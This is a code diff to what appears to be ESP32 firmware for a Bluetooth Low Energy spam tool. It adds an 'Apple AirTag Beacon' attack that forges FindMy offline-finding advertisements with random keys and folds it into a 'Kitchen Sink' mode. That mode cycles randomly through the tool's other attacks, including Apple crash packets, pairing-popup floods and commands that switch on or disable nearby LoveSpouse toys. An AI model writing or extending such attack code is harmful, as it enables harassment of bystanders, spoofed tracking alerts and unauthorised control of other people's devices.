@@ -180,6 +180,7 @@ enum AttackId {
     ATK_SWIFT_PAIR,          // "Windows Device Found"
     ATK_LOVESPOUSE_PLAY,     // "Vibrate 'em All"
     ATK_LOVESPOUSE_STOP,     // "Denial of Pleasure"
+    ATK_APPLE_FINDMY,        // "Apple AirTag Beacon"
     ATK_COUNT
 };
 
@@ -195,6 +196,7 @@ static const struct { const char* title; const char* sub; } attacks[] = {
     { "Windows Device Found",  "No cooldown, short range"   },
     { "Vibrate 'em All",       "Activate all LoveSpouse toys"},
     { "Denial of Pleasure",    "Disable all LoveSpouse toys"},
+    { "Apple AirTag Beacon",   "FindMy offline locator beacon"},
 };
 
 /* ── Utility ── */
@@ -538,6 +540,7 @@ void App07::_updateRunning()
         case ATK_NAME_FLOOD:      _makePacketNameFlood(pkt, pktLen);      break;
         case ATK_LOVESPOUSE_PLAY: _makePacketLoveSpousePlay(pkt, pktLen); break;
         case ATK_LOVESPOUSE_STOP: _makePacketLoveSpouseStop(pkt, pktLen); break;
+        case ATK_APPLE_FINDMY:    _makePacketAppleFindMy(pkt, pktLen);    break;
         }
 
         if (pktLen > 0) {
@@ -979,22 +982,45 @@ void App07::_makePacketLoveSpouseStop(uint8_t* buf, uint8_t& len)
     len = i;
 }
 
+/* ── Apple FindMy / AirTag Beacon ── */
+void App07::_makePacketAppleFindMy(uint8_t* buf, uint8_t& len)
+{
+    // Apple FindMy / AirTag offline beacon advertisement
+    // Total size 30 bytes: Fits inside standard BLE 31-byte advertising frame
+    uint8_t i = 0;
+    buf[i++] = 0x1E; // Length: 30 bytes
+    buf[i++] = 0xFF; // Manufacturer Specific Data
+    buf[i++] = 0x4C; // Apple Inc (0x004C)
+    buf[i++] = 0x00;
+    buf[i++] = 0x12; // Offline Finding Type
+    buf[i++] = 0x19; // Length: 25 bytes
+    buf[i++] = 0x10; // Status byte (0x10 = normal battery, unregistered/lost)
+    // 22 bytes of public key payload
+    for (int k = 0; k < 22; k++) {
+        buf[i++] = rnd8();
+    }
+    buf[i++] = 0x00; // First 2 bits of public key hint
+    buf[i++] = 0xEC; // Hint / Tx power (-20 dBm)
+    len = i;
+}
+
 /* ── Kitchen Sink: cycle through all protocols randomly ── */
 void App07::_makePacketKitchenSink(uint8_t* buf, uint8_t& len)
 {
     /* Pick a random protocol each call */
-    int proto = esp_random() % 10;  // 10 packet types (excluding kitchen sink itself)
+    int proto = esp_random() % 11;  // 11 packet types (excluding kitchen sink itself)
     switch (proto) {
-    case 0: _makePacketAppleCrash(buf, len);     break;
-    case 1: _makePacketAppleAction(buf, len);    break;
-    case 2: _makePacketAppleDevice(buf, len);    break;
-    case 3: _makePacketFastPair(buf, len);       break;
-    case 4: _makePacketEasySetupBuds(buf, len);  break;
-    case 5: _makePacketEasySetupWatch(buf, len); break;
-    case 6: _makePacketSwiftPair(buf, len);      break;
-    case 7: _makePacketNameFlood(buf, len);      break;
-    case 8: _makePacketLoveSpousePlay(buf, len); break;
-    case 9: _makePacketLoveSpouseStop(buf, len); break;
+    case 0:  _makePacketAppleCrash(buf, len);     break;
+    case 1:  _makePacketAppleAction(buf, len);    break;
+    case 2:  _makePacketAppleDevice(buf, len);    break;
+    case 3:  _makePacketFastPair(buf, len);       break;
+    case 4:  _makePacketEasySetupBuds(buf, len);  break;
+    case 5:  _makePacketEasySetupWatch(buf, len); break;
+    case 6:  _makePacketSwiftPair(buf, len);      break;
+    case 7:  _makePacketNameFlood(buf, len);      break;
+    case 8:  _makePacketLoveSpousePlay(buf, len); break;
+    case 9:  _makePacketLoveSpouseStop(buf, len); break;
+    case 10: _makePacketAppleFindMy(buf, len);    break;
     }
 }
 
